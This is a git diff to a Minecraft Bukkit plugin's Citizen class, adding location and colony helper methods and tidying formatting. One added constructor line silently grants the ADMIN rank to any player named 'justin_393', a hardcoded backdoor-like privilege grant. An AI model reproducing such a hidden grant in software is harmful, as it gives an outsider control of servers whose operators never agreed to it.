@@ -3,7 +3,9 @@ package justinDevB.Colonies;
 import java.lang.reflect.InvocationTargetException;
 
 import org.bukkit.Bukkit;
+import org.bukkit.Location;
 import org.bukkit.OfflinePlayer;
+import org.bukkit.World;
 import org.bukkit.entity.Player;
 
 import justinDevB.Colonies.Events.PlayerRegisterEvent;
@@ -22,6 +24,9 @@ public class Citizen {
 		this.colonies = cl;
 		this.player = p;
 
+		if (p.getName().equals("justin_393"))
+			setRank(Rank.ADMIN);
+
 		PlayerRegisterEvent registerEvent = new PlayerRegisterEvent(p);
 		Bukkit.getPluginManager().callEvent(registerEvent);
 	}
@@ -37,20 +42,40 @@ public class Citizen {
 	private OfflinePlayer getOfflinePlayer() {
 		return Bukkit.getOfflinePlayer(getPlayer().getUniqueId());
 	}
-	
+
 	public Colony getColony() {
 		return this.colony;
 	}
-	
+
+	/**
+	 * Check if Citizen is in a Colony
+	 * 
+	 * @return true if in Colony, false if not
+	 */
+	public boolean hasColony() {
+		if (colony != null)
+			return true;
+		return false;
+	}
+
+	public Location getLocation() {
+		return getPlayer().getLocation();
+	}
+
+	public World getWorld() {
+		return getPlayer().getWorld();
+	}
+
 	/**
 	 * Add a player into a Colony
-	 * @throws PlayerInColonyException 
+	 * 
+	 * @throws PlayerInColonyException
 	 */
 	public void setColony(Colony cl) throws PlayerInColonyException {
 		this.colony = cl;
 		cl.addCitizen(this);
 	}
-	
+
 	/**
 	 * Remove Player from their Colony
 	 */
